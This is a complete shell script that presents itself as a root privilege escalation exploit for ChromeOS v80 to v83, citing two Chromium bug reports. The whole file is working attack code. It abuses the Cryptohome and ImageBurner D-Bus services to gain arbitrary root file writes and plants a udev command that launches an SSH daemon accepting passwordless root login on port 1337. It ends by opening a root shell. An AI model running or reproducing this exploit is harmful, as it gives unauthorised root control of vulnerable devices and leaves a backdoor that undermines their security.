# privesc v80 hyperskid NO ARC NO SSHFS NO BINARIES
# made by Rory McNamara and OlyB
# works on v80 through v83
# https://crbug.com/1072233 (udev command execution)
# https://crbug.com/1099390 (ImageBurner file write)

get_salty_username() {
	dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.GetSanitizedUsername string:$1 | grep string | cut -d'"' -f2
}

dbus_pack_user() {
	user=$1
	packeduser=$(echo -n ${user} | hexdump -e '1/1 "0x%02x,"' -v | head -c -1)
	packedlen=$(printf '%x' ${#user})
	echo "0x${packedlen},${packeduser}"
}

stage_sshd() {
	# set up a fake ssh server using the system sshd and enabling passwordless login for root with the provided key
	if [ ! -e /tmp/ssh_host_rsa_key ]; then
		ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
		mkdir /tmp/root/
		cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
	fi
	cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
	rm -f /home/chronos/user/.ssh/known_hosts
}

runasroot() {
	ssh -p 1337 -i /tmp/ssh_host_rsa_key -o StrictHostKeyChecking=no root@127.0.0.1 "$@"
}

MountEx() {
	packeduser=$1
	dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.MountEx \
	array:byte:0x12,${packeduser} \
	array:byte:0xa,0x16,0xa,0xe,0x8,0x0,0x1a,0xa,0x8,0x1,0x10,0x1,0x18,0x1,0x20,0x1,0x28,0x0,0x12,0x4,0x74,0x65,0x73,0x74 \
	array:byte:0x8,0x0,0x12,0x12,0xa,0x10,0xa,0x8,0x8,0x0,0x12,0x4,0x74,0x65,0x73,0x74,0x12,0x4,0x74,0x65,0x73,0x74,0x20,0x0,0x30,0x0 >/dev/null
}

UnmountEx() {
	dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.UnmountEx \
	array:byte: >/dev/null
}

getdevaccess() {
	packed=$(dbus_pack_user ${tgtuser})
	gcache="/home/user/${salty_user}/GCache/v2"

	MountEx ${packed}

	rmdir ${gcache} 2>/dev/null
	rm ${gcache} 2>/dev/null
	ln -s /dev ${gcache}

	UnmountEx
	MountEx ${packed}
}

root_filewrite() {
	tempfile="/home/chronos/u-${salty_user}/Downloads/filewrite"
	echo $1 > ${tempfile}
	ln -s $2 /dev/sdz
	dbus-send --system --print-reply --dest=org.chromium.ImageBurner /org/chromium/ImageBurner org.chromium.ImageBurnerInterface.BurnImage string:${tempfile} string:/dev/sdz > /dev/null
	sleep 0.5
	rm /dev/sdz ${tempfile}
}

writefiles() {
	root_filewrite "E:REMOVE_CMD=/bin/sh -c '/usr/sbin/sshd -f /tmp/sshd_config'" /run/udev/data/+pci\:0000\:00\:00.0
	root_filewrite 1 /sys/devices/pci0000\:00/0000\:00\:00.0/remove
	root_filewrite 1 /sys/devices/pci0000\:00/pci_bus/0000\:00/rescan
}

tgtuser=$(hexdump -e '1/8 "%02x\n"' -n 8 /dev/urandom)@test.test
salty_user="$(get_salty_username ${tgtuser})"

echo "Staging sshd..."
stage_sshd

echo "Getting /dev access..."
getdevaccess

echo "Writing files..."
writefiles

echo "Providing root shell..."
runasroot
